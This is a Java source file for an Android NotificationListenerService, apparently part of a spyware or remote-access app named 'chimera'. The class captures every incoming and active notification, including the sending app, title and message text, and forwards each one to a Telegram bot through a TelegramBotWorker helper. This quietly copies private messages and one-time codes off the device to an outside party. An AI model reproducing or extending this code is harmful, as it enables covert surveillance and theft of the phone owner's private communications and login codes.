package com.chimera;

import android.app.Notification;
import android.content.Context;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationListener extends NotificationListenerService {

    private Context context;

    @Override
    public void onCreate() {
        super.onCreate();
        this.context = getApplicationContext();
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;
        sendNotificationData("New Notification", sbn);
    }

    public static void getActiveNotifications(Context context) {
        try {
            StatusBarNotification[] activeNotifications = instance.getActiveNotifications();
            if (activeNotifications == null || activeNotifications.length == 0) {
                TelegramBotWorker.sendMessage("No active notifications found.", context);
                return;
            }
            TelegramBotWorker.sendMessage("--- Reading " + activeNotifications.length + " Active Notifications ---", context);
            for (StatusBarNotification sbn : activeNotifications) {
                sendNotificationData("Existing Notification", sbn);
            }
        } catch (Exception e) {
            TelegramBotWorker.sendMessage("Failed to get active notifications. Is the Notification Listener permission enabled?", context);
        }
    }

    private static void sendNotificationData(String type, StatusBarNotification sbn) {
        Notification notification = sbn.getNotification();
        if (notification == null) return;

        Bundle extras = notification.extras;
        String title = extras.getString(Notification.EXTRA_TITLE, "No Title");
        CharSequence textChars = extras.getCharSequence(Notification.EXTRA_TEXT);
        String text = (textChars != null) ? textChars.toString() : "No Text";
        String app = sbn.getPackageName();

        String fullMessage = String.format("[%s]\nApp: %s\nTitle: %s\nText: %s", type, app, title, text);
        TelegramBotWorker.sendMessage(fullMessage, instance.getApplicationContext());
    }

    private static NotificationListener instance;
    public NotificationListener() {
        instance = this;
    }
}